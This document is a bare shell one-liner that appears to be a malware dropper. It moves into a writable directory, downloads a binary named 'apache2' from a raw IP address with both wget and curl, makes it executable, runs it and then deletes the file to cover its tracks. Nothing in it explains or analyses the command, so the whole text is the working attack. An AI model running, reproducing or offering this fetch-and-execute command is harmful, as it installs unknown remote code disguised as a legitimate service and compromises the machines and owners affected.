cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://163.172.165.112/apache2; curl -O http://163.172.165.112/apache2; chmod +x apache2; ./apache2; rm -rf apache2
